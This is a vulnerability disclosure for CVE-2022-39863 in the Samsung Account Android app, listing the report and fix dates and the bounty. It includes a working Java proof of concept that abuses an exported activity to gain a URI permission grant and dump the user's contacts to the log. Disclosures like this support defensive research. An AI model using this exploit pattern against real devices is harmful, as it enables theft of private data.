# Details

<table>
    <tr>
        <td>Name</td>
        <td>Samsung Account</td>
    </tr>
    <tr>
        <td>Package name</td>
        <td><code>com.osp.app.signin</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.04.12</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2022.10.04</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Moderate</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-39863">CVE-2022-39863</a> (SVE-2022-0904)</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$1120</td>
    </tr>
</table>

# Description

Oversecured found 30 triggers to send the intent back to the attacker, here are some of them:
![](04%20رئيسية/Samsung%20Vulnerabilities/043.%20Samsung%20account%20—%20Gaining%20access%20to%20arbitrary_%20content%20providers/Oversecured_report.png)

This vulnerability caused read/write access permissions to arbitrary content providers to be passed to the attacker's calling app.

**Proof of Concept**

```java
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    Intent i = new Intent();
    i.setData(ContactsContract.CommonDataKinds.Phone.CONTENT_URI);
    i.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
    i.setClassName("com.osp.app.signin", "com.samsung.android.samsungaccount.authentication.ui.check.user.UserValidateCheck");
    startActivityForResult(i, 0);
}

protected void onActivityResult(int requestCode, int resultCode, Intent data) {
    super.onActivityResult(requestCode, resultCode, data);
    dump(data.getData());
}

public void dump(Uri uri) {
    Cursor cursor = getContentResolver().query(uri, null, null, null, null);
    if (cursor.moveToFirst()) {
        do {
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < cursor.getColumnCount(); i++) {
                if(sb.length() > 0) {
                    sb.append(", ");
                }
                sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
            }
            Log.d("evil", sb.toString());
        } while (cursor.moveToNext());
    }
}
```

## References

- [Oversecured Blog. Gaining access to arbitrary* Content Providers](https://blog.oversecured.com/Gaining-access-to-arbitrary-Content-Providers/)
